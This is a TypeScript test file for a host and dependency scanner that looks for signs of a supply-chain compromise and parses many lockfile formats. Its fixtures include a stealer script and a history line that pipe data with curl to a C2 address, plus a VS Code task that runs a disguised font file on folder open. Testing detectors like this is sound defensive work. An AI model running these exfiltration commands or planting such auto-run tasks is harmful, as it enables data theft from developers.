import { createHash } from "node:crypto";
import { mkdirSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { checkerGroups, scanDeps } from "../src/scan/deps.js";
import { scanHost } from "../src/scan/host.js";
import { parseLockfile } from "../src/scan/lockfiles.js";
import { walk } from "../src/scan/walk.js";
import type { IocFile } from "../src/types.js";
import { AIKIDO_IOCS, aikidoRun, tmp } from "./helpers.js";

const NOW = new Date("2026-11-12T12:00:00Z");
const noLive = async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true });

function put(root: string, rel: string, body: string, mtime?: Date) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

describe("scan host", () => {
  it("finds IOC files, auto-run VS Code tasks, fresh startup items and C2 addresses in history", async () => {
    const home = tmp("ug-home-");
    const stealer = "#!/bin/sh\ncurl -d @- http://194.150.166.244:8080/exfil\n";
    put(home, "code/app/.ci-gvwxh6.sh", stealer);
    put(
      home,
      "code/app/.vscode/tasks.json",
      '{ "tasks": [{ "label": "x", "command": "node public/fonts/fa-solid-400.woff2", "runOptions": { "runOn": "folderOpen" } }] }',
    );
    put(home, "code/app/node_modules/evil/.ci-zzz.sh", "pruned");
    const startup = join(home, "LaunchAgents");
    put(home, "LaunchAgents/com.new.plist", "<key>ProgramArguments</key><array><string>/usr/local/bin/new</string></array>", new Date("2026-11-11T00:00:00Z"));
    put(home, "LaunchAgents/com.old.plist", "<key>Program</key><string>/bin/old</string>", new Date("2025-01-01T00:00:00Z"));
    put(home, ".zsh_history", ": 1:0;ls\n: 2:0;curl http://194.150.166.244:8080/exfil\n");
    put(home, "code/app/.git/config", '[remote "origin"]\n\turl = git@github.com:org/site.git\n');

    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "code")]), noLive, {
      home,
      startupDirs: [startup],
      dropDirs: [],
      hitRepos: ["org/site"],
      skipLive: true,
      now: NOW,
    });
    const t = r.findings.map((f) => `${f.severity}: ${f.title}`);
    expect(t.some((x) => x.startsWith("compromised: File") && x.includes(".ci-gvwxh6.sh"))).toBe(true);
    // The walk skips node_modules, but a package's top level is still checked by name (where droppers sit).
    expect(t.some((x) => x.startsWith("compromised: File") && x.includes("node_modules/evil/.ci-zzz.sh"))).toBe(true);
    expect(t.some((x) => x.startsWith("suspicious: VS Code task runs automatically"))).toBe(true);
    expect(t.some((x) => x.startsWith("suspicious: Startup item com.new.plist") && x.includes("/usr/local/bin/new"))).toBe(true);
    expect(t.some((x) => x.includes("com.old.plist"))).toBe(false);
    expect(t.some((x) => x.startsWith("exposed:") && x.includes(".zsh_history"))).toBe(true);
    expect(t.some((x) => x.startsWith("exposed: Local clone of org/site"))).toBe(true);
    expect(r.gaps.some((g) => g.what.includes("crontab"))).toBe(true);
  });

  it("names the hash when a file matches the stealer's sha256", async () => {
    const home = tmp("ug-hash-");
    const body = "stealer body";
    const digest = createHash("sha256").update(body).digest("hex");
    const iocs: IocFile = {
      campaigns: [
        {
          ...(AIKIDO_IOCS.campaigns[0] as IocFile["campaigns"][0]),
          indicators: [
            { type: "file", value: ".ci-*.sh", source: "S1" },
            { type: "sha256", value: digest, source: "S1" },
          ],
        },
      ],
    };
    put(home, ".ci-abc.sh", body);
    const r = await scanHost(iocs, walk([home]), noLive, { home, startupDirs: [], dropDirs: [], skipLive: true });
    expect(r.findings[0]?.title).toContain("matches the sha256");
    expect(r.findings[0]?.indicator?.type).toBe("sha256");
  });

  it("matches live state: crontab tags and open connections to IOC addresses", async () => {
    const live = async (cmd: string) => {
      if (cmd === "crontab") return { ok: true, status: 0, stdout: "*/5 * * * * /tmp/x #ghc2\n", stderr: "" };
      if (cmd === "lsof") return { ok: true, status: 0, stdout: "node 123 me 20u IPv4 TCP 10.0.0.2:5555->18.143.168.96:8080 (ESTABLISHED)\n", stderr: "" };
      return { ok: false, status: 1, stdout: "", stderr: "", missing: true };
    };
    const home = tmp("ug-live-");
    const r = await scanHost(AIKIDO_IOCS, walk([home]), live, { home, platform: "darwin", startupDirs: [], dropDirs: [] });
    const t = r.findings.map((f) => f.title);
    expect(t).toContain('crontab line 1 contains "#ghc2"');
    expect(t).toContain("Open connection to 18.143.168.96");
  });
});

describe("lockfiles", () => {
  it("reads every supported format", () => {
    expect(
      parseLockfile(
        "package-lock.json",
        JSON.stringify({ packages: { "": {}, "node_modules/a": { version: "1.0.0" }, "node_modules/@s/b": { version: "2.0.0" } } }),
      ),
    ).toEqual([
      { ecosystem: "npm", name: "a", version: "1.0.0" },
      { ecosystem: "npm", name: "@s/b", version: "2.0.0" },
    ]);
    expect(parseLockfile("pnpm-lock.yaml", "packages:\n\n  '@s/b@2.0.0':\n    resolution: x\n\n  a@1.0.0(peer@1):\n    x: y\n")).toEqual([
      { ecosystem: "npm", name: "@s/b", version: "2.0.0" },
      { ecosystem: "npm", name: "a", version: "1.0.0" },
    ]);
    expect(parseLockfile("yarn.lock", '"a@^1.0.0", a@^1.1:\n  version "1.2.0"\n\n"@s/b@npm:^2":\n  version: 2.0.1\n')).toEqual([
      { ecosystem: "npm", name: "a", version: "1.2.0" },
      { ecosystem: "npm", name: "@s/b", version: "2.0.1" },
    ]);
    expect(parseLockfile("Cargo.lock", '[[package]]\nname = "serde"\nversion = "1.0.1"\n')).toEqual([
      { ecosystem: "crates.io", name: "serde", version: "1.0.1" },
    ]);
    expect(parseLockfile("go.sum", "github.com/onuragtas/docker-env v1.0.278 h1:abc=\ngithub.com/onuragtas/docker-env v1.0.278/go.mod h1:def=\n")).toEqual([
      { ecosystem: "go", name: "github.com/onuragtas/docker-env", version: "v1.0.278" },
    ]);
    expect(parseLockfile("composer.lock", JSON.stringify({ packages: [{ name: "digitalelvis/neuronai-studio", version: "v3.14.3" }] }))).toEqual([
      { ecosystem: "packagist", name: "digitalelvis/neuronai-studio", version: "3.14.3" },
    ]);
    expect(parseLockfile("requirements-dev.txt", "requests==2.31.0\nflask>=2\nuvicorn[standard]==0.30.0 ; python_version>'3'\n")).toEqual([
      { ecosystem: "pypi", name: "requests", version: "2.31.0" },
      { ecosystem: "pypi", name: "uvicorn", version: "0.30.0" },
    ]);
    expect(parseLockfile("Gemfile.lock", "GEM\n  specs:\n    rails (7.1.0)\n      actionpack (= 7.1.0)\n")).toEqual([
      { ecosystem: "rubygems", name: "rails", version: "7.1.0" },
    ]);
    expect(parseLockfile("poetry.lock", '[[package]]\nname = "django"\nversion = "5.0"\n')).toEqual([{ ecosystem: "pypi", name: "django", version: "5.0" }]);
  });
});

describe("scan deps", () => {
  it("matches campaign packages and OSV malicious advisories, and cites OSV as a source", async () => {
    const root = tmp("ug-deps-");
    put(
      root,
      "php/composer.lock",
      JSON.stringify({
        packages: [
          { name: "digitalelvis/neuronai-studio", version: "3.14.3" },
          { name: "ok/pkg", version: "1.0.0" },
        ],
      }),
    );
    put(root, "go/go.sum", "github.com/onuragtas/docker-env v1.0.277 h1:abc=\n");
    put(root, "js/package-lock.json", JSON.stringify({ packages: { "node_modules/evil-pkg": { version: "6.6.6" } } }));
    const run = aikidoRun();
    const dirs: string[] = [];
    const checker = async (dir: string) => {
      dirs.push(dir);
      return {
        ok: true,
        vulnerabilities: [
          {
            name: "evil-pkg",
            version: "6.6.6",
            file: join(root, "js/package-lock.json"),
            ecosystem: "npm",
            severity: "critical",
            advisories: [{ id: "MAL-2026-1" }, { ghsa: "GHSA-xxxx" }],
          },
          {
            name: "lodash",
            version: "4.17.0",
            file: join(root, "js/package-lock.json"),
            ecosystem: "npm",
            severity: "high",
            advisories: [{ ghsa: "GHSA-yyyy" }],
          },
        ],
      };
    };
    const r = await scanDeps(AIKIDO_IOCS, walk([root]), run, { checker, roots: [root] });
    expect(dirs).toEqual([join(root, "go"), join(root, "js"), join(root, "php")]);
    expect(r.findings.find((f) => f.severity === "info")?.title).toMatch(/^1 locked package versions have known vulnerabilities \(0 critical, 1 high\)/);
    const t = r.findings.map((f) => f.title);
    expect(t.some((x) => x.includes("digitalelvis/neuronai-studio@3.14.3, named by the campaign"))).toBe(true);
    expect(t.some((x) => x.includes("docker-env"))).toBe(false); // v1.0.277 is not an affected version
    expect(t.some((x) => x.includes("evil-pkg@6.6.6, a malicious package (MAL-2026-1)"))).toBe(true);
    expect(t.some((x) => x.includes("GHSA-xxxx"))).toBe(false);
    const osvSource = run.sources().find((s) => s.origin === "osv");
    expect(osvSource?.url).toBe("https://osv.dev/vulnerability/MAL-2026-1");
    expect(r.findings.find((f) => f.title.includes("evil-pkg"))?.source).toBe(osvSource?.id);
    expect(r.result.stats.lockfiles).toBe(3);
  });

  it("records a gap instead of a clean bill when package-checker fails", async () => {
    const root = tmp("ug-deps2-");
    put(root, "package-lock.json", JSON.stringify({ packages: { "node_modules/a": { version: "1.0.0" } } }));
    const r = await scanDeps(AIKIDO_IOCS, walk([root]), undefined, {
      checker: async () => ({ ok: false, vulnerabilities: [], error: "offline" }),
      roots: [root],
    });
    expect(r.gaps.some((g) => g.why.includes("package-checker failed: offline"))).toBe(true);
  });

  it("groups lockfiles two levels under their root, never one run per lockfile nor the whole home", () => {
    expect(
      checkerGroups(["/h/Documents/Code/a/package-lock.json", "/h/Documents/Code/b/x/yarn.lock", "/h/p/go.sum", "/h/Cargo.lock", "/other/q/uv.lock"], ["/h"]),
    ).toEqual(["/h", "/other/q"]);
    expect(checkerGroups(["/h/Documents/Code/a/package-lock.json", "/h/Documents/Code/b/yarn.lock", "/h/p/go.sum"], ["/h"])).toEqual([
      "/h/Documents/Code",
      "/h/p",
    ]);
  });

  it("runs the real vendored package-checker on a malicious lockfile", async () => {
    // Network: package-checker downloads the OSV/GHSA feeds. Skipped when offline.
    if (process.env.ULTRAGUARD_OFFLINE) return;
    const root = tmp("ug-pc-");
    put(
      root,
      "app/package-lock.json",
      JSON.stringify({ name: "x", lockfileVersion: 3, packages: { "": {}, "node_modules/flatmap-stream": { version: "0.1.1" } } }),
    );
    const run = aikidoRun();
    const { defaultRunner } = await import("../src/runner.js");
    const r = await scanDeps(AIKIDO_IOCS, walk([root]), run, { runner: defaultRunner, roots: [root] });
    if (r.gaps.some((g) => g.why.startsWith("package-checker failed"))) return; // offline runner
    expect(r.findings.some((f) => f.severity === "compromised" && f.title.includes("flatmap-stream@0.1.1, a malicious package (MAL-"))).toBe(true);
  }, 120_000);
});
